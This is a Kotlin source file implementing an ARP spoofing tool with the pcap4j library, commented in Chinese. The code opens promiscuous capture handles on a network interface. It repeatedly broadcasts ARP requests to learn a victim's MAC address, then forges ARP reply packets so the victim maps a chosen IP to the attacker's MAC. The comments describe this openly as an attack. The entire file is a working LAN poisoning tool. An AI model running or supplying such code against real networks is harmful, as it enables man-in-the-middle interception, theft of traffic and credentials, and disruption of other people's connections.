package com.mrx

import org.pcap4j.core.*
import org.pcap4j.packet.ArpPacket
import org.pcap4j.packet.EthernetPacket
import org.pcap4j.packet.namednumber.ArpHardwareType
import org.pcap4j.packet.namednumber.ArpOperation
import org.pcap4j.packet.namednumber.EtherType
import org.pcap4j.util.ByteArrays
import org.pcap4j.util.LinkLayerAddress
import org.pcap4j.util.MacAddress
import java.net.InetAddress

class ArpSpoof(nif: PcapNetworkInterface) : AutoCloseable {

    /**
     * 发送 ARP 请求 用的 handle
     */
    private val reqHandle = nif.openLive(
        65536,
        PcapNetworkInterface.PromiscuousMode.PROMISCUOUS,
        10
    )

    /**
     * 监听 ARP 响应 用的 handle
     */
    private val respHandle = nif.openLive(
        65536,
        PcapNetworkInterface.PromiscuousMode.PROMISCUOUS,
        10
    )

    /**
     * 发送 ARP 响应 用的 handle
     */
    private val sendHandle = nif.openLive(
        65536,
        PcapNetworkInterface.PromiscuousMode.PROMISCUOUS,
        10
    )

    /**
     * 当前选择的 网卡 的 MAC
     */
    private val myMacAddress = nif.linkLayerAddresses[0].toMacAddress()

    /**
     * 当前选择的网卡的 IP
     */
    private val myIPAddress = nif.addresses[0].address

    private val logger = XLog.getLogger(this::class.java)

    private fun LinkLayerAddress.toMacAddress() = MacAddress.getByAddress(address)

    /**
     * ARP 攻击
     * @param target Target
     * @param spoof_ip Target
     */
    fun spoof(target: Target, spoof_ip: Target) {
        val ethPacket = ARP(
            spoof_ip,
            target,
            reqHandle,
            respHandle,
            myIPAddress,
            myMacAddress
        ).getWarpedEthPacketBuilder()
        sendHandle.sendPacket(ethPacket.build())
    }

    /**
     * 关闭资源
     */
    override fun close() {
        reqHandle?.close()
        respHandle?.close()
        sendHandle?.close()
        logger.info("Close Resource")
    }

    /**
     * 攻击对象
     * @property ip InetAddress 该对象的 IP
     * @property mac MacAddress? 该对象的 Mac, 可为空
     * @constructor
     */
    class Target(var ip: InetAddress, var mac: MacAddress? = null)

    /**
     * ARP 数据包包装类
     * @property dstTarget Target 要攻击的对象
     * @property reqHandle PcapHandle Pcap 的 Handle
     * @property myIPAddress InetAddress 自己的 IP
     * @property myMacAddress MacAddress 自己的 Mac
     * @property logger (Logger..Logger?) 日志对象
     * @property ethPacket (Builder..Builder?) 以太网数据包
     * @property arpBuilder (Builder..Builder?) ARP 数据包
     * @constructor
     */
    private class ARP(
        srcTarget: Target,
        private val dstTarget: Target,
        val reqHandle: PcapHandle,
        val respHandle: PcapHandle,
        private val myIPAddress: InetAddress,
        private val myMacAddress: MacAddress
    ) {

        private val logger = XLog.getLogger(this::class.java)

        // 构造基础信息
        private val ethPacket = EthernetPacket.Builder()
            .srcAddr(myMacAddress)
            .type(EtherType.ARP)
            .paddingAtBuild(true)

        // 构造基础信息
        private val arpBuilder = ArpPacket.Builder()
            .hardwareType(ArpHardwareType.ETHERNET)
            .protocolType(EtherType.IPV4)
            .hardwareAddrLength(MacAddress.SIZE_IN_BYTES.toByte())
            .protocolAddrLength(ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES.toByte())
            .operation(ArpOperation.REPLY)
            .srcProtocolAddr(srcTarget.ip)
            .dstProtocolAddr(dstTarget.ip)

        /**
         * 通过 IP 获取 Mac
         */
        private fun getMacByIP() {
            val filter = "arp and src host ${dstTarget.ip.hostAddress} " +
                    "and dst host ${myIPAddress.hostAddress} " +
                    "and ether dst ${Pcaps.toBpfString(myMacAddress)}"
            var flag = false
            // 开新线程, 不断发送 ARP 请求
            Thread {
                val ethPacket = EthernetPacket.Builder()
                    .srcAddr(myMacAddress)
                    .dstAddr(MacAddress.ETHER_BROADCAST_ADDRESS)
                    .payloadBuilder(
                        ArpPacket.Builder()
                            .hardwareType(ArpHardwareType.ETHERNET)
                            .protocolType(EtherType.IPV4)
                            .hardwareAddrLength(MacAddress.SIZE_IN_BYTES.toByte())
                            .protocolAddrLength(ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES.toByte())
                            .operation(ArpOperation.REQUEST)
                            .srcHardwareAddr(myMacAddress)
                            .dstHardwareAddr(MacAddress.ETHER_BROADCAST_ADDRESS)
                            .srcProtocolAddr(myIPAddress)
                            .dstProtocolAddr(dstTarget.ip)
                    )
                    .type(EtherType.ARP)
                    .paddingAtBuild(true)
                logger.info("发送 ARP 请求")
                while (!flag) {
                    // 发送 ARP 请求, 尝试获取被攻击对象 MAC
                    reqHandle.sendPacket(ethPacket.build())
                    // 2 秒一次
                    Thread.sleep(2000)
                }
                logger.info("停止发送 ARP 请求")
            }.start()

            logger.debug(filter)
            logger.debug("开始监听 ARP 数据包")
            respHandle.setFilter(filter, BpfProgram.BpfCompileMode.OPTIMIZE)
            // 阻塞, 监听 ARP 响应包
            respHandle.loop(1, PacketListener { packet ->
                if (packet.contains(ArpPacket::class.java)) {
                    val arpPacket = packet.get(ArpPacket::class.java)
                    // 如果找到了响应包
                    if (arpPacket.header.operation == ArpOperation.REPLY) {
                        // 那就将 MAC 缓存下来
                        dstTarget.mac = arpPacket.header.srcHardwareAddr
                        flag = true
                        logger.debug("解析到的 Mac 地址为 ${dstTarget.mac}")
                    }
                }
            })
        }

        /**
         * 获取构造好的数据包
         * @return EthernetPacket.Builder
         */
        fun getWarpedEthPacketBuilder(): EthernetPacket.Builder {
            // 如果不知道被攻击主机的 MAC
            if (dstTarget.mac == null) {
                // 那就尝试获取 MAC
                getMacByIP()
            }
            // 填充剩下的数据
            arpBuilder.srcHardwareAddr(myMacAddress).dstHardwareAddr(dstTarget.mac)
            ethPacket.dstAddr(dstTarget.mac).payloadBuilder(arpBuilder)
            return this.ethPacket
        }
    }
}